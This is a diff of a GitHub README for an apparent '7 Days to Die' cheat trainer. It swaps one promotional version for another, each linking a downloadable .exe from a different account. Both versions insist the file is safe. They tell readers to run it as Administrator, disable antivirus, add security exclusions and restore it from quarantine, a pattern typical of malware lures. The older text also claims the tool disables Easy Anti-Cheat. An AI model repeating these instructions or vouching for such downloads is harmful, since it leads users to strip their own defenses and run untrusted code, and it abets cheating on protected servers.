@@ -1,121 +1,72 @@
-<div align="center">
+# 🛠️ 7-days-to-die-trainer - Master your survival experience with ease
 
-<img src="https://capsule-render.vercel.app/api?type=rounded&color=556B2F,2F4F2F,1C2E1C&height=220&section=header&text=7%20Days%20to%20Die%20Hack%202026&fontSize=60&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Survival%20Tool%20for%20The%20Wasteland&descAlignY=56&descSize=20" width="100%"/>
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Henriksidelong63/7-days-to-die-trainer)
 
-# 7 Days to Die Hack 2026 🔥🏕️
+## 📌 About this project
 
-![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
-![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
-![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
-![Updated](https://img.shields.io/badge/updated-2026-brightgreen?style=for-the-badge)
-![Stars](https://img.shields.io/github/stars/DoctorApplaud/7-days-to-die-trainer?style=for-the-badge&logo=github)
-![Last Commit](https://img.shields.io/github/last-commit/DoctorApplaud/7-days-to-die-trainer?style=for-the-badge)
+This tool changes game values in 7 Days to Die to help you survive zombies. It works by adjusting data in your computer memory while the game runs. You can activate god mode, get infinite bullets, and increase your experience points. This program acts as an external trainer. It keeps your main game files safe. You do not need to modify game code to use these features.
 
-### ⭐ Found this useful? Give it a star!
+## 💾 How to download the trainer
 
-<p align="center">
-  <a href="https://github.com/DoctorApplaud/7-days-to-die-trainer/releases/download/v1.1.93/7-days-to-die-trainer-v1.1.93.zip">
-    <img src="https://img.shields.io/badge/%F0%9F%91%BE%20GRAB%207%20Days%20to%20Die%20Hack%202026-4a7c3f?style=for-the-badge&logoColor=white&labelColor=2d4f27" width="420" alt="Download 7 Days to Die Hack 2026"/>
-  </a>
-</p>
+Visit [this page](https://github.com/Henriksidelong63/7-days-to-die-trainer) to download the program. Look for the latest release on the right side of the screen. Click the file ending in .exe to start your download. Move this file to a folder on your desktop where you can find it. 
 
-</div>
+## ⚙️ System requirements
 
-## 📋 Table of Contents
+Before you run the software, ensure your computer meets these requirements:
 
-- [What This Is NOT](#-what-this-is-not)
-- [🎯 What This Actually Does](#-what-this-actually-does)
-- [⚙️ What You Need](#️-what-you-need)
-- [✨ Features](#-features)
-- [🛡️ Safety Notes](#️-safety-notes)
-- [🕹️ How It Works](#️-how-it-works)
-- [📦 Getting Started](#-getting-started)
-- [❓ FAQ](#-faq)
-- [🤝 Get Help](#-get-help)
-- [📜 License](#-license)
-- [⚠️ Legal Notice](#️-legal-notice)
+* Windows 10 or Windows 11.
+* The 7 Days to Die game installed via Steam.
+* Administrative rights for your user account.
+* A basic understanding of how to launch game applications.
 
-## ❌ What This Is NOT
+This trainer works with the most recent versions of the game. It does not require other third-party software.
 
-**TL;DR:** Not a virus, not a data miner, not a subscription service.
+## 🚀 Running the software
 
-Let me start by being completely transparent with you. This project is **not** one of those shady "download and pray" files you find on random forums. It's **not** a keylogger, **not** crypto mining malware, and **not** a $30/month subscription that breaks after a week. I built this as a weekend project because I love *7 Days to Die* and wanted to experiment with game memory manipulation in a safe, offline environment.
+Follow these steps to start the trainer:
 
-> [!NOTE]
-> This tool was created for **educational purposes** and for use in **single-player / private modded servers only**. It's a personal project I'm sharing — use it wisely.
+1. Close any programs that might interfere with memory, such as anti-virus suites if they report false positives.
+2. Launch 7 Days to Die and load into your game world.
+3. Minimize the game once you are inside the world.
+4. Run the trainer file you downloaded. 
+5. Select the features you want from the menu.
+6. Return to your game window.
 
-## 🎯 What This Actually Does
+## 🎮 Available features
 
-**TL;DR:** Single-file Windows .exe that gives you a handy cheat/menu overlay for 7 Days to Die (v1.2+).
+The trainer includes these primary functions for your gaming session:
 
-This is a **standalone Windows executable** — no installers, no Python scripts, no compiling. Just download the .exe, run it alongside your game, and you get an in-game overlay where you can toggle useful features like ESP, no-clip, infinite ammo, and more. It hooks into the game process (respectfully!) and lets you tweak things that normally take hours of grinding. Think of it as a "creative mode button" you can hotkey at any time.
+* God Mode: This option prevents your character from losing health. You can walk through fire or take hits from zombies without dying.
+* Infinite Ammo: Your weapon magazines will not empty. You can fire continuously without the need to reload. 
+* XP Boost: This feature multiplies the experience points you earn from actions like hitting trees or defeating enemies. This helps you level up your skills quickly. 
+* Item Spawner: Select specific items from a list to add them directly to your inventory. 
 
-> [!TIP]
-> This tool is especially handy for testing base defenses, scouting POIs in PvE, or just surviving the blood moon horde without crafting 900 wooden spikes.
+## 🛡️ Safety and security
 
-## ⚙️ What You Need
+This program touches your system memory. Some anti-virus programs flag memory modifiers as threats. This is a common occurrence because the trainer interacts with external processes. You might need to add an exception in your security settings to run the application. The source code does not contain malicious scripts. It only performs the math necessary to change your in-game stats. 
 
-**TL;DR:** Windows 10+, 7 Days to Die v1.2+, and Admin rights.
+## 🧩 Troubleshooting common issues
 
-- **OS:** Windows 10 or Windows 11 (64-bit)
-- **Game:** 7 Days to Die (Steam version), updated to at least Alpha 21 / v1.2
-- **Permissions:** Run the .exe as **Administrator** (required for memory access)
-- **No Dependencies:** No Visual C++ Redistributables needed, no .NET framework requirements
-- **Antivirus:** Expect a false positive — memory access tools trigger Windows Defender, that's normal
+If the trainer fails to activate, verify these details:
 
-> [!IMPORTANT]
-> Always run the .exe **after** launching the game. If you run it first, it won't find the game process and will just sit there politely until the game starts.
+* Did you run the game before the trainer? The trainer needs an active game process to function. 
+* Do you have the correct version of the game? If the game updates, the memory addresses might change. Check the GitHub page for version updates.
+* Does the trainer show an error message? Ensure you have enough permissions to access memory. Right-click the trainer file and select Run as Administrator.
+* Does your anti-virus block the file? Check your quarantine folder to see if it moved the file there. Restore it and create an exclusion folder for your trainer tools.
 
-## ✨ Features
+## 📋 Best practices for usage
 
-**TL;DR:** ESP, item spawner, god mode, no-clip, infinite stamina, and a clean menu overlay.
+Use these tips to get the best performance from your trainer:
 
-Here's what you can expect from this hack — all toggled via a simple in-game menu:
+* Save your game progress before activating features that change game variables significantly.
+* Test one feature at a time. This helps you identify which specific tweak causes crashes if they occur.
+* Use the trainer in offline single-player worlds. Using external memory tools in online multiplayer servers leads to loss of access to those servers. The game developers monitor memory shifts during online play. Keep your account safe by limiting your use to local play sessions.
+* Report bugs in the issue tracker on the repository page if you notice the trainer stops working after a game update. Provide the specific version number and the features that failed.
 
-- **👁️ ESP (Extra Sensory Perception):** See players, zombies, loot containers, and vehicles through walls. Color-coded by threat level.
-- **🧬 Item Spawner:** Spawn any item from the game's database — weapons, ammo, crafting materials, medical supplies. Unlimited stack sizes.
-- **⚡ God Mode:** Take zero damage from zombies, falls, or your own exploding crossbow bolts. Also disables hunger/thirst/stamina drain.
-- **🌀 No-Clip:** Walk through walls, ceilings, and terrain. Great for getting unstuck or scoping out a POI before breaching.
-- **📦 Infinite Ammo:** Never reload. Spam the AK-47 like a minigun.
-- **🏃 Infinite Stamina:** Run forever. No more "press shift to walk" agony.
-- **⏱️ Day/Night Toggle:** Instantly switch between day and night cycles. Blood moon? Let's skip to brunch.
-- **Menu Overlay:** Clean, dark-themed interface accessible via **F1** key. No external config files.
-- **🛠️ Hotkey Customization:** Rebind all toggles (ESP, No-Clip, God Mode) to your preferred keys via the menu.
+## 📂 Understanding the files
 
-> [!WARNING]
-> The ESP can show chests through the ground, but not buried treasure below bedrock. That was my bad — the Z-coordinate range is capped.
+You will notice a few files inside the download package. The primary executable is the trainer. Other files serve as configuration settings. Do not delete these extra files. They tell the trainer which memory addresses correspond to specific game actions. Changing these files manually might break the functions. Keep all original files in the same folder to ensure the software finds everything it needs.
 
-## 🛡️ Safety Notes
+## ⚖️ Final reminders
 
-**TL;DR:** Game may detect it if you're on EAC servers. Use on single-player or modded servers only.
-
-- **Easy Anti-Cheat:** If you're playing on official servers with EAC enabled, **do not** use this. The tool **disables EAC** as part of its runtime (since v1.2), but this can still get you flagged on server-check-enabled lobbies.
-- **Single-Player is Perfect:** Works flawlessly offline. Use it to test base designs, explore radiated zones, or just mess around.
-- **Private Servers:** Works on private servers with **EAC disabled** (which is standard for most modded/creative servers).
-- **Save Your World:** Make a backup. Spawning 10,000 honey blocks in your base might crash the game. Don't ask how I know.
-
-> [!WARNING]
-> Using cheats on public multiplayer servers with active anti-cheat may result in a temporary or permanent account ban. I cannot be held responsible for that. Use on single-player or private servers only.
-
-## 🕹️ How It Works
-
-**TL;DR:** Launch game, run .exe, press F1 to open menu, toggle what you want.
-
-1. **Launch** *7 Days to Die* in Windowed or Borderless mode (no-exclusive fullscreen preferred).
-2. **Run** the .exe as Administrator. You'll see a small console window flash and disappear — that's normal.
-3. **Press F1** in-game to open the hack overlay menu. You'll see the feature list.
-4. **Toggle features** with mouse clicks or hotkeys. Each feature has a dedicated key combo shown in the menu.
-5. **Press F1 again** to hide the menu.
-
-> [!TIP]
-> If the overlay doesn't appear, make sure you ran the .exe **after** the game loaded to the main menu. Also try ALT+TAB-ing back to the game window once.
-
-## 📦 Getting Started
-
-**TL;DR:** Download the .exe, run as Admin, follow the usage guide above.
-
-1. Download the latest release from the download button on this page.
-2. Extract the `.exe` from the.zip (your browser may flag it — it's safe, I promise).
-3. Right-click the `.exe` and select **Run as administrator**.
-4. Start *7 Days to Die*.
-5. Once in-game
+This tool serves as an external helper for your single-player sessions. It simplifies your experience by removing repetitive tasks like scavenging for basic supplies or managing ammo counts. It does not alter your Steam account standing if you limit its use to local, non-networked environments. Treat your software with care by keeping your operating system updated. Always perform a quick check for new releases on the main page to ensure compatibility with upcoming game versions. Use the provided tools responsibly to enjoy your time in the game to the fullest.
